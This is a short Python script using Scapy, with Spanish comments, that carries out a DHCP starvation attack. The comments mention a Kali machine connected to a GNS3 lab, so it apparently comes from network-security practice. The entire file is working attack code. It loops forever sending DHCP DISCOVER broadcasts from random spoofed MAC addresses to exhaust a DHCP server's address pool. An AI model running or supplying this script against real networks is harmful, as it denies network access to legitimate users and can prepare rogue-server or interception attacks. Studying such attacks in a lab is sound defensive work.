#!/usr/bin/env python3
from scapy.all import *

# Configuración
iface = "eth1" # Tu interfaz en Kali conectada al GNS3

def dhcp_starvation():
    print(f"[*] Iniciando ataque DHCP Starvation en {iface}...")
    
    while True:
        # Generar MAC aleatoria
        fake_mac = RandMAC()
        # Generar ID de transacción aleatorio
        xid_random = random.randint(1, 900000000)
        
        # Construcción del paquete
        # Ether: Broadcast
        # IP: Source 0.0.0.0, Dest 255.255.255.255
        # UDP: Puerto 68 (Cliente) -> 67 (Servidor)
        # BOOTP: Operación 1 (Request), chaddr=MAC falsa
        # DHCP: Opción 'message-type' = discover
        
        packet = (Ether(src=fake_mac, dst="ff:ff:ff:ff:ff:ff") /
                  IP(src="0.0.0.0", dst="255.255.255.255") /
                  UDP(sport=68, dport=67) /
                  BOOTP(chaddr=fake_mac, xid=xid_random) /
                  DHCP(options=[("message-type", "discover"), "end"]))
        
        sendp(packet, iface=iface, verbose=0)
        print(f"Enviando DISCOVER con MAC: {fake_mac}")

if __name__ == "__main__":
    dhcp_starvation()